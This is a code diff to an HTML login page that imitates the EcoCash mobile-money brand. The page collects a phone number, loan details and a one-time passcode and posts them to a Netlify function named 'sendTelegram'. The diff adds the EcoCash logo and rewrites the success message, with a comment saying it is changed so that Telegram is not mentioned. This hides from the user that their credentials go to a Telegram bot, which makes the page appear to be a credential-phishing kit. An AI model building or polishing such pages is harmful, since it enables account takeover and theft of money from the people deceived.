@@ -8,6 +8,7 @@
 <style>
   body{font-family:Inter,system-ui,Arial;background:linear-gradient(180deg,#f7fbff,#e8f3ff);margin:0;display:flex;align-items:center;justify-content:center;height:100vh}
   .card{width:360px;background:#fff;padding:22px;border-radius:12px;box-shadow:0 12px 30px rgba(2,6,23,0.06)}
+  .logo{height:40px;display:block;margin:0 auto 10px}
   h2{text-align:center;margin:0 0 12px;color:#111}
   label{display:block;font-size:13px;color:#374151;margin-top:8px}
   input,select{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff}
@@ -17,10 +18,14 @@
   .otp-box{background:#fff;padding:18px;border-radius:12px;min-width:280px}
   .req{color:#d04444;margin-right:6px}
   .small{font-size:12px;color:#6b7280}
+  .success{color:#16a34a;font-weight:600}
 </style>
 </head>
 <body>
   <div class="card">
+    <!-- logo using uploaded file path -->
+    <img src="sandbox:/mnt/data/eco.png" alt="EcoCash logo" class="logo" onerror="this.style.display='none'">
+
     <h2>Log In</h2>
     <form id="loginForm">
       <label><span class="req">★</span>Mobile Number
@@ -63,7 +68,7 @@
     if(!document.getElementById('phone').value) document.getElementById('phone').value = '+263';
   }
 
-  // helper sending function
+  // helper sending function (calls your Netlify function)
   async function sendToServer(payload) {
     return fetch('/.netlify/functions/sendTelegram', {
       method: 'POST',
@@ -108,11 +113,13 @@
       const resp = await sendToServer(payload);
       if(!resp.ok){
         const txt = await resp.text();
+        // show friendly error
         otpStatus.textContent = 'Server error: ' + (txt || resp.status);
       } else {
-        otpStatus.textContent = 'Success — sent to Telegram ✓';
+        // Success — show user-friendly message (no Telegram mention)
+        otpStatus.innerHTML = '<span class="success">Success — your request has been received.</span>';
         sessionStorage.removeItem('loanForm');
-        setTimeout(()=> window.location.href = 'thankyou.html', 1100);
+        setTimeout(()=> window.location.href = 'thankyou.html', 1200);
       }
     } catch (err) {
       otpStatus.textContent = 'Network error';
